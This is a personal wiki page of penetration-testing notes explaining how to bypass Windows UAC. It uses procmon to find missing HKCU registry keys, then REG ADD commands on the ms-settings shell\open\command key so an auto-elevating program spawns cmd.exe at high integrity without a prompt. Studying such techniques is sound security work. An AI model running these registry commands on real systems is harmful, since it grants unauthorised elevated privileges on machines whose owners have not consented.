Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-10-22T09:31:52-05:00

====== UAC Bypass ======
Created Friday 22 October 2021



===== Running a command as admin: =====
{{{code: lang="sh" linenumbers="False"
powershell.exe Start-Process cmd.exe -Verb runAs
}}}




===== UAC Bypass by manipulating the registry =====

==== Tools needed: ====
[[Tools:Windows:SysInternals:procmon]]
[[Tools:Windows:SysInternals:sigcheck]]
[[Tools:Windows:reg]]

==== Strategy ====
The goal is to escalate from admin user running in moderate integrity to run a program that runs in high (admin) integrity without popping a prompt.
The way to do this is to use the procmon tool to analyze how to program interacts with the registry.
What we want to look for are registry key that the program looks for, but can't find and we have write access to.
This way, we can make the program use the key + associated value and perhaps make it run a program under admin rights.

==== First ====
We'll need to find an exe that runs under admin privileges and has auto-elevate turned on. (This last bit prevents popping the prompt when the program starts)
This information is displayed in the manifest of the exe
See [[Tools:Windows:SysInternals:sigcheck]] to see how to extract the manifest

==== Second ====
Run [[Tools:Windows:SysInternals:procmon]]
Then, run the program under test.

==== Third ====
Procmon outputs a lot of information, so we'll need to filter
{{{code: lang="texinfo" linenumbers="False"
"Process Name" "is" "<program.exe>" then "Include"
}}}

* Only includes events about our program

Next we'll focus on the operation on the registry:
{{{code: lang="texinfo" linenumbers="False"
"Operation" "contains" "Reg" then "Include"
}}}

* Only includes events with operations that contain "Reg"

Now we want to find all the operation  that have "NAME NOT FOUND" in the result
{{{code: lang="texinfo" linenumbers="False"
"Result" "contains" "NAME NOT FOUND" then "Include"
}}}

* Only includes events of which the result of the operation contains "NAME NOT FOUND"

Now we need to focus on the keys we can control. These are the HKCU entries. See [[Technologies:Windows:Registry]]
{{{code: lang="texinfo" linenumbers="False"
"Path" "begins with" "HKCU" then "Include"
}}}

* Includes all events of which the path begins with HKCU

==== Fourth ====
At this time we've got a somewhat managable list of registry items that we need to inspect visually.
Look for <xxx>/shell/open/command

This indicates the program tries to open <xxx> in a shell.

Once you have found a candidate, you'll need to play around with the filters to see if you can determine if there is some kind of fall back pattern.
ie: The program can't find the reg key in HKCU, so it falls back to HKCR

==== Fifth ====
Now we can create the entry in the registry, so it will use our instead of the fallback

{{{code: lang="sh" linenumbers="False"
REG ADD HKCU\<full key> # eg: HKCU\Software\Classes\ms-settings\Shell\Open\command
}}}


Clear the output of procmon (ctrl+x) and restart the program. Now you'll notice the program can't find (<xxx>\shell\open\command\DelegateExecute)
Let's add that one too:
{{{code: lang="sh" linenumbers="False"
REG ADD HKCU\<full key> /v DelegateExecute /t REG_SZ # eg: HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
}}}


Now when restarting, it can find the \delegateexecute path,  but will still exute the comand from HKCR, this is because there is no default value. Let's add
{{{code: lang="sh" linenumbers="False"
REG ADD HKCU\<full key> /d cmd.exe # eg: HKCU\Software\Classes\ms-settings\Shell\Open\command /d cmd.exe /f
}}}


When you restart, a shell will spawn running in high integrity



===== SEE =====
[[Enumeration:Windows]]
[[Tools:Windows:PowerShell]]
[[Tools:Windows:reg]]

https://docs.microsoft.com/en-us/windows/win32/shell/launch
